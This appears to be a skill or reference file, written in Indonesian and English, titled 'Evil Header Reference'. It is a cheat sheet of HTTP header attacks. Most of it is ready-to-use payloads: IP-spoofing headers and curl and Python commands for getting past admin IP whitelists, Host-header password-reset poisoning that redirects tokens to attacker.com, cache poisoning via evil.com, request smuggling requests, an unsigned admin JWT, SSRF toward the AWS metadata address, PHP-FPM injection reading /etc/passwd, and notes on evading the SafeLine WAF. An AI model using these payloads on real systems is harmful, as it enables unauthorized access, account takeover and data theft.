---
name: evil-header
description: "Evil headers — bypass IP restriction, access admin via headers, X-Forwarded-For spoofing, Host header injection, SSRF via header, request smuggling. Gunakan untuk bypass IP whitelist, akses panel admin, SSRF, cache poisoning."
---

# Evil Header Reference

## 1. IP SPOOFING HEADERS

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### Bypass Admin Panel (IP Whitelist)
```bash
# Target hanya izinkan akses dari 127.0.0.1 atau 10.0.0.x
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin/

# PHP kode yang rentan:
# $_SERVER['HTTP_X_FORWARDED_FOR'] → bisa dimanipulasi!
# Aman: $_SERVER['REMOTE_ADDR']

# Python test
import requests
headers = {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}
r = requests.get('https://target.com/admin/', headers=headers)
print(r.status_code)
```

---

## 2. HOST HEADER INJECTION

### Password Reset Poisoning
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ Reset link dikirim ke email dengan host attacker.com
→ Victim klik → token tercapture

### Web Cache Poisoning
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

### SSRF via Host Header
```http
GET / HTTP/1.1
Host: internal.service.local
```

---

## 3. REQUEST SMUGGLING

### CL.TE (Content-Length + Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

---

## 4. WAF BYPASS VIA HEADERS

```
# Bypass IP-based WAF
X-Forwarded-For: WAF_IP_OR_TRUSTED_IP

# Bypass User-Agent detection
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

# Bypass Referer check
Referer: https://target.com/login

# Custom header injection
X-Custom-IP-Authorization: 127.0.0.1
X-Auth-Token: admin_token
X-Api-Key: admin_key
Authorization: Basic YWRtaW46YWRtaW4=  (admin:admin base64)

# PHP CGI / Apache bypass
Content-Type: application/x-www-form-urlencoded;charset=utf-7
Content-Type: application/json
```

---

## 5. CACHE POISONING HEADERS

```
# Unkeyed headers (sering di-cache tanpa dicek)
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: https
X-Forwarded-Proto: https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
```

---

## 6. AUTHENTICATION BYPASS HEADERS

```python
# JWT bypass via header
headers = {
    'Authorization': 'Bearer none.eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',
    'X-Admin': 'true',
    'X-Role': 'admin',
    'X-User-ID': '1',
    'X-Authenticated': 'true',
}
```

---

## 7. SSRF VIA HEADERS

```
# Beberapa aplikasi fetch URL dari header
X-Forwarded-For: http://internal.service/
X-Original-URL: @internal.service/
Referer: http://169.254.169.254/latest/meta-data/  (AWS metadata)
```

---

## 8. PHP/CGI SPECIFIC HEADERS

```
# PHP path info bypass
GET /admin.php/nonexistent HTTP/1.1
# PHP processes admin.php even with /nonexistent appended

# PHP-FPM FastCGI injection
Content-Type: application/x-www-form-urlencoded
PHP_VALUE: auto_prepend_file=/etc/passwd

# CGI injection
Content-Type: application/x-www-form-urlencoded;/[INJECTION]
```

---

## 9. SAFELINE SPECIFIC HEADERS

```
# SafeLine menggunakan sl-session cookie
Set-Cookie: sl-session=...

# JWT untuk bypass challenge
Cookie: sl-challenge-jwt=eyJ...

# SafeLine mungkin check referrer
Referer: https://target.com/login

# Test dengan custom headers
X-SafeLine-Debug: 1  (mungkin tidak ada efek)
```

---

## CHECKLIST EVIL HEADERS

1. ☐ Test X-Forwarded-For: 127.0.0.1 untuk admin panel
2. ☐ Test semua IP spoofing headers
3. ☐ Test Host header injection (password reset)
4. ☐ Test X-Original-URL / X-Rewrite-URL
5. ☐ Check apakah ada cache poisoning vector
6. ☐ Test Authorization header dengan common tokens
7. ☐ Test Content-Type variations
8. ☐ Check untuk request smuggling (TE.CL atau CL.TE)

## TOOL REFERENSI

```bash
# ParamSpider — temukan parameter termasuk header-based
paramspider -d target.com

# ParamMiner (Burp Suite extension)
# Menemukan header yang di-reflect atau di-cache

# smuggler.py
python3 smuggler.py -u https://target.com

# h2csmuggler
python3 h2csmuggler.py --test https://target.com
```
